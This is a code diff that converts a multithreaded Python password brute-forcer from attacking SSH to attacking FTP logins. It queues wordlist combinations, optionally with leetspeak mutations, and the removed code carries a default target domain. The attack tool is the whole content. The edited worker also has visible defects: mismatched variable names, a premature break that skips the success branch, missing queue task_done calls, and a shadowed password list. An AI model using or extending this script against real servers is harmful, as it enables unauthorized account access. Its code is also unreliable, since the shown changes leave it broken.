@@ -1,7 +1,6 @@
 import socket
-import paramiko
 import argparse
-
+import ftplib
 from threading import Thread, Lock, Event
 from queue import Queue
 
@@ -23,18 +22,6 @@ user = args.user
 passwd = args.passwd
 mutant = args.mutate
 
-def check_ssh(ip="steminfinity.in", port=22, timeout=3):
-    try:
-        with socket.create_connection((ip, port), timeout=timeout):
-            
-            print("Success. The Port is Open")
-            return True
-    except (socket.timeout, ConnectionRefusedError, OSError):
-        print("Failure. The Port is not open")
-        return False
-
-
-check_ssh()
 
 def smart_mutate(base_word):
     leet_map = {'a': '@', 'i': '1', 'e': '3', 'o': '0', 's': '$'}
@@ -79,8 +66,6 @@ passwords = words(passwd)
 
 
 
-client = paramiko.SSHClient()
-client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 
 '''for userc in users:
@@ -101,8 +86,8 @@ client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 if mutant:
     for userc in users:
         for base in passwords:
-            for password in smart_mutate(base):
-                combo_queue.put((userc, password))
+            for passwords in smart_mutate(base):
+                combo_queue.put((userc, passwords))
 else:
     for userc in users:
         for password in passwords:
@@ -113,39 +98,6 @@ else:
 
 
 
-
-'''
-def ssh_worker():
-    
-
-    while not combo_queue.empty():
-        if stop_event.is_set():
-            combo_queue.task_done()
-            return
-        user , password =  combo_queue.get()
-        try:
-            if stop_event.is_set():
-                combo_queue.task_done()
-                return
-            client = paramiko.SSHClient()
-            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            client.connect(host,username=user, password=password, timeout=3)
-
-
-            with result_lock :
-                print(f"Success 🎉🎉✨✨✨🧨🧨🎇🎇🎎🎍🎍 {user}  :   {password}")
-                stop_event.set()
-            
-            client.close()
-
-        except Exception as e:
-            with result_lock:
-                print(f" Failure with {host}   :    {user}   :    {password}")
-
-        finally:
-            combo_queue.task_done()
-
-'''
 truepass = []
 trueuser = []
 
@@ -160,10 +112,13 @@ def ssh_worker():
             if stop_event.is_set():
                 combo_queue.task_done()
                 return
+            with ftplib.FTP() as serve:
+                serve.connect(host,21,timeout=5)
+                serve.login(userc, password)
+                break
+            
 
-            client = paramiko.SSHClient()
-            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            client.connect(host, username=user, password=password, timeout=3)
+            
 
             with result_lock:
                 print(f"✅ SUCCESS 🎉 {user} : {password}")
@@ -171,14 +126,13 @@ def ssh_worker():
                 trueuser.append(user) 
                 stop_event.set()
 
-            client.close()
+            
 
         except Exception as e:
             with result_lock:
                 print(f"❌ FAIL    {user} : {password}")
 
-        finally:
-            combo_queue.task_done()
+        
 
 
 
